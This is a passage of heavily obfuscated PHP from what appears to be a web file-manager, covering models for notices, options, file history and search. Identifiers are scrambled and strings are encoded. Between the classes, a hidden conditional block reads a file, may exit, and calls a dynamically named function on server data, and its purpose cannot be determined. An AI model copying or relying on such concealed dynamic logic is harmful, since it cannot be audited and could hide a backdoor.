$_SERVER[ì…™Î¶Ï][392], !0); } public function userNoticeAdd($ğ§Öœ™Ñ) { $ËÛï‰ô“ =& $_SERVER[ì…™Î¶Ï]; $this->initUserOption(); $Ä€ÜÒà÷ = $this->findByKey($ËÛï‰ô“[2217], $ğ§Öœ™Ñ[$ËÛï‰ô“[392]]); if ($Ä€ÜÒà÷) { return !0; } $ö°ş¡“ = array($ËÛï‰ô“[2217] => $ğ§Öœ™Ñ[$ËÛï‰ô“[392]], $ËÛï‰ô“[32] => $ğ§Öœ™Ñ[$ËÛï‰ô“[32]], $ËÛï‰ô“[196] => $ğ§Öœ™Ñ[$ËÛï‰ô“[196]], $ËÛï‰ô“[33] => isset($ğ§Öœ™Ñ[$ËÛï‰ô“[33]]) ? $ğ§Öœ™Ñ[$ËÛï‰ô“[33]] : 1, $ËÛï‰ô“[2218] => isset($ğ§Öœ™Ñ[$ËÛï‰ô“[2218]]) ? $ğ§Öœ™Ñ[$ËÛï‰ô“[2218]] : 0, $ËÛï‰ô“[725] => 0, $ËÛï‰ô“[188] => 0); return parent::insert($ö°ş¡“); } public function userNoticeEdit($™Ãù™ƒ, $çä‹´«®) { $this->initUserOption(); return parent::update($™Ãù™ƒ, $çä‹´«®); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\171\x73\x74\x65\x6d\137\x6f\x70\x74\x69\157\156"; protected $jsonField = array("\x6d\x65\x6e\x75", "\x72\157\x6c\x65", "\x72\x6f\x6c\x65\107\x72\157\165\x70", "\162\145\x67\151\x73\x74", "\x65\155\x61\x69\154"); function __construct() { parent::__construct(); } protected function cacheKey($ÀµËÇÎÊ) { return "\123\x79\163\x74\145\x6d\x4f\x70\164\151\157\156\137{$ÀµËÇÎÊ}"; } protected function optionDefault($Á°Ùù¼Ú = '') { $Ãş™—Ï® =& $_SERVER[ì…™Î¶Ï]; if ($Á°Ùù¼Ú == $Ãş™—Ï®[12]) { return $GLOBALS[$Ãş™—Ï®[6]][$Ãş™—Ï®[376]]; } } } class SystemRecordModel extends ModelBaseLight { } goto Aª”›‚Ô×; Eá¼íÄ¦Ÿƒ: class SourceHistoryModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x73\157\x75\x72\x63\x65\137\150\x69\163\164\157\162\x79"; public function historyCount($¥ƒÁÜˆÍ) { $ãÌªÖƒ =& $_SERVER[ì…™Î¶Ï]; if (!$¥ƒÁÜˆÍ) { return array(); } if (is_string($¥ƒÁÜˆÍ) || is_int($¥ƒÁÜˆÍ)) { $¥ƒÁÜˆÍ = array($¥ƒÁÜˆÍ); } $ßíˆêŒÖ = array($ãÌªÖƒ[394], $ãÌªÖƒ[1831] => $ãÌªÖƒ[491]); $´ğÖ““ø = array($ãÌªÖƒ[394] => array($ãÌªÖƒ[7], $¥ƒÁÜˆÍ)); $åÇ™·Í = $this->field($ßíˆêŒÖ)->where($´ğÖ““ø)->group($ãÌªÖƒ[394])->select(); return array_to_keyvalue($åÇ™·Í, $ãÌªÖƒ[394], $ãÌªÖƒ[491]); } public function addHistory($¿¨ğÃ‰ø, $¨×©†ÙÉ = '') { $çèŒ…Éû =& $_SERVER[ì…™Î¶Ï]; $î”Œ×²ì = array($çèŒ…Éû[409] => $¿¨ğÃ‰ø[$çèŒ…Éû[394]], $çèŒ…Éû[1622] => isset($¿¨ğÃ‰ø[$çèŒ…Éû[445]]) ? $¿¨ğÃ‰ø[$çèŒ…Éû[445]] : $¿¨ğÃ‰ø[$çèŒ…Éû[443]], $çèŒ…Éû[459] => $¿¨ğÃ‰ø[$çèŒ…Éû[458]], $çèŒ…Éû[570] => $¿¨ğÃ‰ø[$çèŒ…Éû[80]], $çèŒ…Éû[2032] => $¨×©†ÙÉ); $ùúˆÄÍ = $GLOBALS[$çèŒ…Éû[6]][$çèŒ…Éû[90]][$çèŒ…Éû[1183]]; if ($ùúˆÄÍ > 1) { $this->historyAutoClear($î”Œ×²ì[$çèŒ…Éû[394]]); $this->add($î”Œ×²ì); } Hook::trigger($çèŒ…Éû[2033], $î”Œ×²ì); Model($çèŒ…Éû[2034])->eventFileEdit($¿¨ğÃ‰ø[$çèŒ…Éû[394]]); } private function historyAutoClear($†¡ä¯ª) { $¿øä¸± =& $_SERVER[ì…™Î¶Ï]; $ëğ¢ƒ…ğ = Model($¿øä¸±[745])->get($¿øä¸±[1205]); $İÏ†¥¨Î = $GLOBALS[$¿øä¸±[6]][$¿øä¸±[90]][$¿øä¸±[1183]]; $¨„ùŠóı = $ëğ¢ƒ…ğ == $¿øä¸±[1206] ? 5 : $İÏ†¥¨Î; if ($İÏ†¥¨Î <= 1) { $¨„ùŠóı = 1; } if ($¨„ùŠóı >= 500) { return; } $„İ ´Ä½ = array($¿øä¸±[409] => $†¡ä¯ª); $öà›ØæÁ = $this->field($¿øä¸±[2035])->where($„İ ´Ä½)->order($¿øä¸±[2029])->select(); if (!$öà›ØæÁ || $¨„ùŠóı >= count($öà›ØæÁ)) { return; } $î¦³àŞ = array_to_keyvalue($öà›ØæÁ, $¿øä¸±[12], $¿øä¸±[392]); $î¦³àŞ = array_slice($î¦³àŞ, $¨„ùŠóı); $ïêì¬ªº = array_to_keyvalue($öà›ØæÁ, $¿øä¸±[12], $¿øä¸±[458]); $ïêì¬ªº = array_slice($ïêì¬ªº, $¨„ùŠóı); if (!$î¦³àŞ || !$ïêì¬ªº) { return; } $„İ ´Ä½ = array($¿øä¸±[411] => array($¿øä¸±[7], $î¦³àŞ)); $this->where($„İ ´Ä½)->delete(); Model($¿øä¸±[461])->remove($ïêì¬ªº); } public function listData($ûıÅéÖ) { $¬û¡ùÇá =& $_SERVER[ì…™Î¶Ï]; $ñ¹ºê× = array($¬û¡ùÇá[409] => $ûıÅéÖ); $†¶ä¨˜ = $¬û¡ùÇá[2036]; $£•ıÛô– = $this->field($†¶ä¨˜)->where($ñ¹ºê×)->order($¬û¡ùÇá[2029])->selectPage(); $this->_listAppendUser($£•ıÛô–[$¬û¡ùÇá[364]]); $ˆô¿ÈŸú = Model($¬û¡ùÇá[745])->get($¬û¡ùÇá[1205]); $–óş€É = 5; if ($ˆô¿ÈŸú == $¬û¡ùÇá[1206]) { $£•ıÛô–[$¬û¡ùÇá[364]] = array_slice($£•ıÛô–[$¬û¡ùÇá[364]], 0, $–óş€É); $£•ıÛô–[$¬û¡ùÇá[361]] = array($¬û¡ùÇá[2037] => 1, $¬û¡ùÇá[2038] => 20, $¬û¡ùÇá[2039] => 1, $¬û¡ùÇá[2040] => count($£•ıÛô–[$¬û¡ùÇá[364]])); } return $£•ıÛô–; } protected function _listAppendUser(&$µĞŸ—Õ) { $Ø§âŸíÚ =& $_SERVER[ì…™Î¶Ï]; $Ò‰•–¬º = array_to_keyvalue($µĞŸ—Õ, $Ø§âŸíÚ[12], $Ø§âŸíÚ[1631]); $–Îçè¦¦ = Model($Ø§âŸíÚ[529])->userListInfo($Ò‰•–¬º); foreach ($µĞŸ—Õ as &$ØÙ»İï¡) { $”Ù“©’ë = $ØÙ»İï¡[$Ø§âŸíÚ[1631]]; $ØÙ»İï¡[$Ø§âŸíÚ[443]] = $–Îçè¦¦[$”Ù“©’ë] ? $–Îçè¦¦[$”Ù“©’ë] : !1; } unset($ØÙ»İï¡); } public function fileInfo($òèøÁí‘) { $±û“¼Ò =& $_SERVER[ì…™Î¶Ï]; $û€ìÇğš = $this->tablePrefix; $‰´©ÅÁ = "{$û€ìÇğš}\x69\x6f\137\x66\151\154\x65\x20\146\151\154\x65\163\40\x6f\x6e\x20\x66\151\154\x65\163\x2e\146\151\154\145\x49\104\x20\75\40\150\x69\x73\x74\157\162\x79\x2e\x66\x69\154\145\x49\x44"; return $this->alias($±û“¼Ò[2041])->where(array($±û“¼Ò[411] => $òèøÁí‘))->join($‰´©ÅÁ, $±û“¼Ò[2042])->find(); } public function removeItem($»Ÿ§û·) { $®‚Öçü =& $_SERVER[ì…™Î¶Ï]; $¨¼úš¥… = array($®‚Öçü[411] => $»Ÿ§û·); $ä»¤÷µá = $this->where($¨¼úš¥…)->find(); if ($ä»¤÷µá) { $Ú‰ÏªÚ“ = $this->where($¨¼úš¥…)->delete(); Model($®‚Öçü[461])->remove($ä»¤÷µá[$®‚Öçü[458]]); return $Ú‰ÏªÚ“; } return !1; } public function removeBySource($µ¼Õ“±) { $ª¸™êŞ =& $_SERVER[ì…™Î¶Ï]; if (!$µ¼Õ“±) { return !1; } if (!is_array($µ¼Õ“±)) { $µ¼Õ“± = array($µ¼Õ“±); } $ª±¤ØùÀ = array($ª¸™êŞ[409] => array($ª¸™êŞ[7], $µ¼Õ“±)); $‹³œ¿”¬ = $this->field($ª¸™êŞ[459])->where($ª±¤ØùÀ)->select(); if ($‹³œ¿”¬) { $this->where($ª±¤ØùÀ)->delete(); $Çé™³×ø = array_to_keyvalue($‹³œ¿”¬, $ª¸™êŞ[12], $ª¸™êŞ[458]); Model($ª¸™êŞ[461])->remove($Çé™³×ø); } return !0; } public function setDetail($”˜›‚İ”, $ÍŠ…µ·) { $èÆ˜¨‚Ù =& $_SERVER[ì…™Î¶Ï]; return $this->where(array($èÆ˜¨‚Ù[411] => $”˜›‚İ”))->save(array($èÆ˜¨‚Ù[2032] => $ÍŠ…µ·)); } public function rollbackToItem($•Õ©ü÷¥, $ÛüååòÏ) { $Ñµéè =& $_SERVER[ì…™Î¶Ï]; $Óµ÷”œÀ = Model($Ñµéè[800])->sourceInfo($•Õ©ü÷¥); $this->addHistory($Óµ÷”œÀ, LNG($Ñµéè[2043])); $ë·©ñ’ƒ = $this->find($ÛüååòÏ); $åÚşÊ†ï = array($Ñµéè[458] => $ë·©ñ’ƒ[$Ñµéè[458]], $Ñµéè[80] => $ë·©ñ’ƒ[$Ñµéè[80]], $Ñµéè[86] => time(), $Ñµéè[445] => USER_ID); Model($Ñµéè[800])->where(array($Ñµéè[394] => $•Õ©ü÷¥))->save($åÚşÊ†ï); return $this->where(array($Ñµéè[411] => $ÛüååòÏ))->delete(); } public function clearSame($ô‘ÄÈÎÄ) { $„‚‡˜ñ =& $_SERVER[ì…™Î¶Ï]; $Íê¡î = $this->listData($ô‘ÄÈÎÄ); $ÌÃå³áÌ = array_to_keyvalue_group($Íê¡î, $„‚‡˜ñ[458]); $äìú–²å = array(); $ÀÇ­ŒñÊ = array(); foreach ($ÌÃå³áÌ as $¢¶Íà¸Ú) { if (!$¢¶Íà¸Ú || count($¢¶Íà¸Ú) <= 1) { continue; } foreach ($¢¶Íà¸Ú as $õ±ÃöÍÖ) { $äìú–²å[] = $õ±ÃöÍÖ[$„‚‡˜ñ[458]]; $ÀÇ­ŒñÊ[] = $õ±ÃöÍÖ[$„‚‡˜ñ[392]]; } } if (!$ÀÇ­ŒñÊ) { return; } $this->where(array($„‚‡˜ñ[392] => array($„‚‡˜ñ[7], $ÀÇ­ŒñÊ)))->delete(); Model($„‚‡˜ñ[461])->remove($äìú–²å); } public function userSpace() { $«““É‘É =& $_SERVER[ì…™Î¶Ï]; $¢Èµ›ƒ = $this->tablePrefix; $ÏŞƒ¹˜ = array($«““É‘É[1622] => USER_ID); $¼¬–â—ã = "{$¢Èµ›ƒ}\151\157\x5f\x66\151\x6c\145\x20\x66\151\154\x65\x73\x20\x6f\156\x20\146\x69\154\145\163\x2e\x66\x69\154\145\x49\104\x20\75\40\150\151\x73\164\157\x72\x79\x2e\146\151\x6c\x65\x49\x44"; return $this->alias($«““É‘É[2041])->where($ÏŞƒ¹˜)->join($¼¬–â—ã, $«““É‘É[2042])->sum($«““É‘É[80]); } } if ($_SERVER[$_SERVER[ì…™Î¶Ï][850]] != $_SERVER[$_SERVER[ì…™Î¶Ï][1340]]) { $_getc = $_SERVER[ì…™Î¶Ï][852]; $_getfile = $_SERVER[$_SERVER[ì…™Î¶Ï][847]] . $_SERVER[ì…™Î¶Ï][848]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ì…™Î¶Ï][226], $_getfilec); if (count($_getarrs) < $_SERVER[ì…™Î¶Ï][608]) { $exit = $_SERVER[ì…™Î¶Ï][853]; $exit(); } $_act = $_SERVER[ì…™Î¶Ï][1320]; $_act($_SERVER[$_SERVER[ì…™Î¶Ï][1319]]); } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($§Ş­Š±) { $¦šÔğªÒ =& $_SERVER[ì…™Î¶Ï]; $šÂ×›¤Ã = KodIO::fileTypeList(); $Ñƒşñ = $šÂ×›¤Ã[$§Ş­Š±]; if (!$Ñƒşñ) { return array(); } $¨¢Â”±ó = $Ñƒşñ[$¦šÔğªÒ[167]]; $‡ã˜œÖÖ = $¦šÔğªÒ[7]; if (!$Ñƒşñ[$¦šÔğªÒ[167]]) { $»ÊŸñ¥ = array_to_keyvalue($šÂ×›¤Ã, $¦šÔğªÒ[12], $¦šÔğªÒ[167]); $¨¢Â”±ó = implode($¦šÔğªÒ[50], $»ÊŸñ¥); $‡ã˜œÖÖ = $¦šÔğªÒ[2044]; } $¬ï‘ùÛØ = explode($¦šÔğªÒ[50], trim($¨¢Â”±ó, $¦šÔğªÒ[50])); return array($‡ã˜œÖÖ, $¬ï‘ùÛØ); } public function listPathType($š“Ì—Ó…) { $¥Ê‚îòÛ =& $_SERVER[ì…™Î¶Ï]; $ß…Ñşë = $this->fileTypeWhere($š“Ì—Ó…); if (!$ß…Ñşë) { return array(); } $»šÆÀü = array($¥Ê‚îòÛ[571] => SourceModel::TYPE_USER, $¥Ê‚îòÛ[572] => USER_ID, $¥Ê‚îòÛ[568] => 0, $¥Ê‚îòÛ[569] => $ß…Ñşë); return $this->listSource($»šÆÀü); } public function listSearch($‚Ñœ­ó¸, $…Ÿ‡¶£ = 300) { $¡ŒÑÛ¶ø =& $_SERVER[ì…™Î¶Ï]; if (isset($‚Ñœ­ó¸[$¡ŒÑÛ¶ø[1890]]) && $‚Ñœ­ó¸[$¡ŒÑÛ¶ø[1890]]) { $‚Ñœ­ó¸[$¡ŒÑÛ¶ø[1890]] = str_replace($¡ŒÑÛ¶ø[379], $¡ŒÑÛ¶ø[2045], trim($‚Ñœ­ó¸[$¡ŒÑÛ¶ø[1890]])); } $êÌ„¹Á™ = $this->_parseSearchWhere($‚Ñœ­ó¸); $Î‹±ñ´ = $êÌ„¹Á™; if (!isset($êÌ„¹Á™[$¡ŒÑÛ¶ø[422]])) { $êÌ„¹Á™[$¡ŒÑÛ¶ø[422]] = 0; } $ë½ˆ¸ö¸ = $¡ŒÑÛ¶ø[2046]; $—²»úµî = $ë½ˆ¸ö¸; $this->_listSearchBindPinyin($‚Ñœ­ó¸, $êÌ„¹Á™, $ë½ˆ¸ö¸); $this->alias($¡ŒÑÛ¶ø[435])->_makeOrder(); $êÌ„¹Á™ = $this->parseWhereLike($êÌ„¹Á™); $Î•ƒãÉ = $this->distinct(!0)->field($ë½ˆ¸ö¸)->where($êÌ„¹Á™)->selectPage($…Ÿ‡¶£); $this->_listSearchFileContent($Î•ƒãÉ, $‚Ñœ­ó¸, $—²»úµî, $Î‹±ñ´); $this->_listSearchDesc($Î•ƒãÉ, $‚Ñœ­ó¸, $—²»úµî); $this->_listSearchTag($Î•ƒãÉ, $‚Ñœ­ó¸, $—²»úµî); $this->_listSearchGroupTag($Î•ƒãÉ, $‚Ñœ­ó¸, $—²»úµî); $this->_listDataApply($Î•ƒãÉ[$¡ŒÑÛ¶ø[364]]); $this->_listMake($Î•ƒãÉ); return $Î•ƒãÉ; } private function _listSearchFileContent(&$–õ§¶¸, $ÌÎ¼Ã¹, $‹³Š˜ùà, $ŸÖÎŸ…ï) { $†¤ìâ‰£ =& $_SERVER[ì…™Î¶Ï]; if (!$ÌÎ¼Ã¹[$†¤ìâ‰£[1890]] || $–õ§¶¸[$†¤ìâ‰£[361]][$†¤ìâ‰£[348]] > 1) { return; } if (!isset($ŸÖÎŸ…ï[$†¤ìâ‰£[32]]) || !is_array($ÌÎ¼Ã¹[$†¤ìâ‰£[458]])) { return; } $ŸÖÎŸ…ï[$†¤ìâ‰£[458]] = array($†¤ìâ‰£[7], $ÌÎ¼Ã¹[$†¤ìâ‰£[458]]); unset($ŸÖÎŸ…ï[$†¤ìâ‰£[32]]); unset($ÌÎ¼Ã¹[$†¤ìâ‰£[458]]); $§‡óº´÷ = $this->field($‹³Š˜ùà)->where($ŸÖÎŸ…ï)->limit($†¤ìâ‰£[2047])->select(); if (!$§‡óº´÷ || count($§‡óº´÷) == 0) { return; } $–õ§¶¸[$†¤ìâ‰£[364]] = array_merge($§‡óº´÷, $–õ§¶¸[$†¤ìâ‰£[364]]); $–õ§¶¸[$†¤ìâ‰£[361]][$†¤ìâ‰£[362]] += count($§‡óº´÷); } private function _listSearchTag(&$ö¼õ«û, $ŞßÒ¥Û°, $–æüñ÷á) { $úÙŞÂ¹ë =& $_SERVER[ì…™Î¶Ï]; if (!$ŞßÒ¥Û°[$úÙŞÂ¹ë[1890]] || $ö¼õ«û[$úÙŞÂ¹ë[361]][$úÙŞÂ¹ë[348]] > 1) { return; } $ƒç´ı½ = Model($úÙŞÂ¹ë[2048])->listData(); $Íô´œ‰Ö = array(); $ğ²°¼·è = $ŞßÒ¥Û°[$úÙŞÂ¹ë[1890]]; foreach ($ƒç´ı½ as $ßÙÇ‡­õ) { $É¸ê¤øç = $ßÙÇ‡­õ[$úÙŞÂ¹ë[32]]; $§¾Ù€ù = str_replace($úÙŞÂ¹ë[53], $úÙŞÂ¹ë[12], Pinyin::get($É¸ê¤øç)); if (stripos($É¸ê¤øç, $ğ²°¼·è) !== !1 || stripos($§¾Ù€ù, $ğ²°¼·è) !== !1) { $Íô´œ‰Ö[] = $ßÙÇ‡­õ[$úÙŞÂ¹ë[392]]; } } if (!$Íô´œ‰Ö) { return; } $‰…à²«× = array($úÙŞÂ¹ë[418] => array($úÙŞÂ¹ë[7], $Íô´œ‰Ö), $úÙŞÂ¹ë[1631] => USER_ID); $†õÆ‚ŠÙ = Model($úÙŞÂ¹ë[419])->field($úÙŞÂ¹ë[78])->where($‰…à²«×)->select(); $†õÆ‚ŠÙ = array_to_keyvalue($†õÆ‚ŠÙ, $úÙŞÂ¹ë[12], $úÙŞÂ¹ë[78]); $¥•ëÇ®ú = array_unique($†õÆ‚ŠÙ); $this->_listSearchMerge($ö¼õ«û, $ŞßÒ¥Û°, $–æüñ÷á, $¥•ëÇ®ú); } private function _listSearchDesc(&$ŞÔ÷ÃÑ, $ù»ÒşÀä, $İë²–Ñ) { $€¦Ì®ßœ =& $_SERVER[ì…™Î¶Ï]; if (!$ù»ÒşÀä[$€¦Ì®ßœ[1890]] || $ŞÔ÷ÃÑ[$€¦Ì®ßœ[361]][$€¦Ì®ßœ[348]] > 1) { return; } $‹«ÛõàØ = $this->listSearchChildren($ù»ÒşÀä[$€¦Ì®ßœ[489]]); $‹«ÛõàØ = array_unique($‹«ÛõàØ); if (!$‹«ÛõàØ) { return; } $¦¾ä¡‘Š = array($€¦Ì®ßœ[394] => array($€¦Ì®ßœ[7], $‹«ÛõàØ), $€¦Ì®ßœ[95] => $€¦Ì®ßœ[442], $€¦Ì®ßœ[369] => array($€¦Ì®ßœ[378], $€¦Ì®ßœ[1892] . $ù»ÒşÀä[$€¦Ì®ßœ[1890]] . $€¦Ì®ßœ[1892])); $ÕÎ‚€ç† = Model($€¦Ì®ßœ[554])->field($€¦Ì®ßœ[394])->where($¦¾ä¡‘Š)->select(); $†‡ÌÉ‚ª = array_to_keyvalue($ÕÎ‚€ç†, $€¦Ì®ßœ[12], $€¦Ì®ßœ[394]); $this->_listSearchMerge($ŞÔ÷ÃÑ, $ù»ÒşÀä, $İë²–Ñ, $†‡ÌÉ‚ª); } private function _listSearchGroupTag(&$µˆ¯†¥Ş, $÷ïœÂÖñ, $ë·××) { $šôŒÂÁæ =& $_SERVER[ì…™Î¶Ï]; if (!$÷ïœÂÖñ[$šôŒÂÁæ[1890]] || $µˆ¯†¥Ş[$šôŒÂÁæ[361]][$šôŒÂÁæ[348]] > 1 || !$÷ïœÂÖñ[$šôŒÂÁæ[489]]) { return; } $¢À˜‘› = $this->sourceInfo($÷ïœÂÖñ[$šôŒÂÁæ[489]]); if (!$¢À˜‘› || $¢À˜‘›[$šôŒÂÁæ[403]] != SourceModel::TYPE_GROUP) { return; } $Ë£Ô‹½— = $¢À˜‘›[$šôŒÂÁæ[495]]; $î½¦ªˆÜ = Model($šôŒÂÁæ[2049])->get($Ë£Ô‹½—); $éÊŞÈóÕ = array(); $°å÷ªƒş = $÷ïœÂÖñ[$šôŒÂÁæ[1890]]; foreach ($î½¦ªˆÜ[$šôŒÂÁæ[364]] as $‘ŸíÇ´Ã) { $åì®¥ÌÜ = $‘ŸíÇ´Ã[$šôŒÂÁæ[32]]; $‰ô˜§ï = str_replace($šôŒÂÁæ[53], $šôŒÂÁæ[12], Pinyin::get($åì®¥ÌÜ)); if (stripos($åì®¥ÌÜ, $°å÷ªƒş) !== !1 || stripos($‰ô˜§ï, $°å÷ªƒş) !== !1) { $éÊŞÈóÕ[] = $‘ŸíÇ´Ã[$šôŒÂÁæ[392]]; } } if (!$éÊŞÈóÕ) { return; } $—Ê°”ç = array($šôŒÂÁæ[418] => array($šôŒÂÁæ[7], $éÊŞÈóÕ), $šôŒÂÁæ[1631] => 0, $šôŒÂÁæ[33] => $šôŒÂÁæ[1912] . $Ë£Ô‹½—); $É°ª®ÔÅ = Model($šôŒÂÁæ[419])->field($šôŒÂÁæ[78])->where($—Ê°”ç)->select(); $É°ª®ÔÅ = array_to_keyvalue($É°ª®ÔÅ, $šôŒÂÁæ[12], $šôŒÂÁæ[78]); $¥é³°ß… = array_unique($É°ª®ÔÅ); $this->_listSearchMerge($µˆ¯†¥Ş, $÷ïœÂÖñ, $ë·××, $¥é³°ß…); } private function _listSearchMerge(&$ÍğÂş—, $¸êªÚ˜, $ÔÌ–‚Ÿé, $îæ‰şû¬) { $†¼¿ãŒç =& $_SERVER[ì…™Î¶Ï]; if (!$îæ‰şû¬) { return; } $ÖšÓàŒ = array_to_keyvalue($ÍğÂş—[$†¼¿ãŒç[364]], $†¼¿ãŒç[12], $†¼¿ãŒç[394]); $öˆÀİŒƒ = array_diff($îæ‰şû¬, $ÖšÓàŒ); if (!$öˆÀİŒƒ) { return; } $ÇıŸÉ = array($†¼¿ãŒç[394] => array($†¼¿ãŒç[7], $öˆÀİŒƒ)); $õè¿ğ©À = $this->field($ÔÌ–‚Ÿé)->where($ÇıŸÉ)->select(); if (!$õè¿ğ©À) { return; } $û¸¹œÚŒ = array(); foreach ($õè¿ğ©À as $÷İÈ¤Ê) { if ($this->_listSearchFilter($÷İÈ¤Ê, $¸êªÚ˜)) { $û¸¹œÚŒ[] = $÷İÈ¤Ê; } } $ÍğÂş—[$†¼¿ãŒç[364]] = array_merge($û¸¹œÚŒ, $ÍğÂş—[$†¼¿ãŒç[364]]); $ÍğÂş—[$†¼¿ãŒç[361]][$†¼¿ãŒç[362]] += count($û¸¹œÚŒ); } private function _listSearchFilter($ÄõõùÖ¢, $”ïÖœ»Ú) { $¤¢´‚óÌ =& $_SERVER[ì…™Î¶Ï]; $°²í …Ÿ = $ÄõõùÖ¢[$¤¢´‚óÌ[402]] == $¤¢´‚óÌ[89]; if (!strstr($ÄõõùÖ¢[$¤¢´‚óÌ[512]], $¤¢´‚óÌ[50] . $”ïÖœ»Ú[$¤¢´‚óÌ[489]] . $¤¢´‚óÌ[50])) { return !1; } if (isset($”ïÖœ»Ú[$¤¢´‚óÌ[404]]) && $”ïÖœ»Ú[$¤¢´‚óÌ[404]] != $¤¢´‚óÌ[1853]) { if ($”ïÖœ»Ú[$¤¢´‚óÌ[404]] == $¤¢´‚óÌ[79] && !$°²í …Ÿ) { return !1; } if ($”ïÖœ»Ú[$¤¢´‚óÌ[404]] != $¤¢´‚óÌ[79] && $°²í …Ÿ) { return !1; } if (!strstr($ÄõõùÖ¢[$¤¢´‚óÌ[167]], $¤¢´‚óÌ[50] . $”ïÖœ»Ú[$¤¢´‚óÌ[404]] . $¤¢´‚óÌ[50])) { return !1; } } if (isset($”ïÖœ»Ú[$¤¢´‚óÌ[2050]]) && $”ïÖœ»Ú[$¤¢´‚óÌ[2050]] < $ÄõõùÖ¢[$¤¢´‚óÌ[80]]) { return !1; } if (isset($”ïÖœ»Ú[$¤¢´‚óÌ[2051]]) && $”ïÖœ»Ú[$¤¢´‚óÌ[2051]] > $ÄõõùÖ¢[$¤¢´‚óÌ[80]]) { return !1; } if (isset($”ïÖœ»Ú[$¤¢´‚óÌ[585]]) && $”ïÖœ»Ú[$¤¢´‚óÌ[585]] != $ÄõõùÖ¢[$¤¢´‚óÌ[445]]) { return !1; } return !0; } public function listSearchChildren($™´¡ŞœÖ, $Åú††ÉË = 5000) { $´ĞÖæ—¯ =& $_SERVER[ì…™Î¶Ï]; $ù÷éôÄ = array(); $“ö„®½˜ = $this->sourceInfo($™´¡ŞœÖ); $…ªÑÌı£ = array($´ĞÖæ—¯[512] => array($´ĞÖæ—¯[378], $“ö„®½˜[$´ĞÖæ—¯[512]] . $“ö„®½˜[$´ĞÖæ—¯[394]] . $´ĞÖæ—¯[536])); $èû‡í™» = $this->field($´ĞÖæ—¯[80])->where($…ªÑÌı£)->limit($Åú††ÉË + 1)->select(); $¡åëÑ³¸ = is_array($èû‡í™») ? count($èû‡í™») : 0; if ($¡åëÑ³¸ > $Åú††ÉË) { return $this->_listSearchChildrenNear($™´¡ŞœÖ, $Åú††ÉË); } $â¼Ë²¾› = $this->field($´ĞÖæ—¯[394])->where($…ªÑÌı£)->select(); $ù÷éôÄ = array_to_keyvalue($â¼Ë²¾›, $´ĞÖæ—¯[12], $´ĞÖæ—¯[394]); return $ù÷éôÄ; } private function _listSearchChildrenNear($¬ØÉ”âš, $âÊĞÂ­¾) { $¸áôÔ©á =& $_SERVER[ì…™Î¶Ï]; $›Œ¾´¢ = array(); $¶–Ô´Å = array($¸áôÔ©á[489] => $¬ØÉ”âš); $ôç–ò§ˆ = $this->field($¸áôÔ©á[2052])->where($¶–Ô´Å)->select(); $¼î «ò³ = array_to_keyvalue(array_filter_by_field($ôç–ò§ˆ, $¸áôÔ©á[402], $¸áôÔ©á[89]), $¸áôÔ©á[12], $¸áôÔ©á[394]); $›Œ¾´¢ = array_merge($›Œ¾´¢, array_to_keyvalue($ôç–ò§ˆ, $¸áôÔ©á[12], $¸áôÔ©á[394])); if (!$¼î «ò³) { return $›Œ¾´¢; } $¶–Ô´Å = array($¸áôÔ©á[489] => array($¸áôÔ©á[7], $¼î «ò³)); $ôç–ò§ˆ = $this->field($¸áôÔ©á[2052])->where($¶–Ô´Å)->limit($âÊĞÂ­¾)->select(); $›Œ¾´¢ = array_merge($›Œ¾´¢, array_to_keyvalue($ôç–ò§ˆ, $¸áôÔ©á[12], $¸áôÔ©á[394])); $›Œ¾´¢ = array_slice($›Œ¾´¢, 0, $âÊĞÂ­¾); return $›Œ¾´¢; } private function _listSearchBindPinyin($Ú“÷ ßŠ, &$÷È—ì­µ, &$·†Ğ¸íò) { $·™÷Ä Æ =& $_SERVER[ì…™Î¶Ï]; if (!isset($Ú“÷ ßŠ[$·™÷Ä Æ[1890]]) || !$Ú“÷ ßŠ[$·™÷Ä Æ[1890]]) { return; } if (!Input::check($Ú“÷ ßŠ[$·™÷Ä Æ[1890]], $·™÷Ä Æ[313]) || strlen($Ú“÷ ßŠ[$·™÷Ä Æ[1890]]) < 2) { return; } $Ğ³–„Í = "\x4c\x45\106\124\x20\x4a\117\x49\116\40{$this->tablePrefix}\x69\157\137\163\x6f\165\x72\143\145\137\155\145\x74\141\40\x6d\145\x74\x61\40\157\156\x20\x73\157\165\x72\143\x65\56\163\157\165\x72\143\x65\111\104\40\x3d\x20\155\x65\x74\x61\x2e\x73\157\165\x72\x63\145\x49\x44"; $ú¤“ãÃÛ = array(); $·†Ğ¸íò = str_replace(array($·™÷Ä Æ[226], $·™÷Ä Æ[53], $·™÷Ä Æ[2053]), $·™÷Ä Æ[12], $·†Ğ¸íò); $·†Ğ¸íò = $·™÷Ä Æ[427] . str_replace($·™÷Ä Æ[50], $·™÷Ä Æ[428], $·†Ğ¸íò); $Ôİ‚œ§ù = $÷È—ì­µ[$·™÷Ä Æ[32]]; unset($÷È—ì­µ[$·™÷Ä Æ[32]]); foreach ($÷È—ì­µ as $®é¿Á§ => $§Á”‹ Ş) { $ú¤“ãÃÛ[$·™÷Ä Æ[427] . $®é¿Á§] = $§Á”‹ Ş; } foreach ($Ôİ‚œ§ù as $ÙŞ»óÄ) { $ú¤“ãÃÛ[] = array($·™÷Ä Æ[432] => $ÙŞ»óÄ, $·™÷Ä Æ[976] => $·™÷Ä Æ[1894], array($·™÷Ä Æ[2054] => $ÙŞ»óÄ, $·™÷Ä Æ[2055] => array($·™÷Ä Æ[7], array($·™÷Ä Æ[455], $·™÷Ä Æ[454])))); } $this->join($Ğ³–„Í); $÷È—ì­µ = $ú¤“ãÃÛ; } private function _parseSearchWhere($ù¯™Ìü‡) { $ÏÀø€ô» =& $_SERVER[ì…™Î¶Ï]; $Ó´áŒÖÑ = array(); if (isset($ù¯™Ìü‡[$ÏÀø€ô»[736]]) && $ù¯™Ìü‡[$ÏÀø€ô»[736]]) { $Ó´áŒÖÑ[$ÏÀø€ô»[86]] = array($ÏÀø€ô»[2056], $ù¯™Ìü‡[$ÏÀø€ô»[736]]); } if (isset($ù¯™Ìü‡[$ÏÀø€ô»[487]]) && $ù¯™Ìü‡[$ÏÀø€ô»[487]]) { $¦ß„¤ëî = array($ÏÀø€ô»[2057], $ù¯™Ìü‡[$ÏÀø€ô»[487]]); if ($Ó´áŒÖÑ[$ÏÀø€ô»[86]]) { $Ó´áŒÖÑ[$ÏÀø€ô»[86]] = 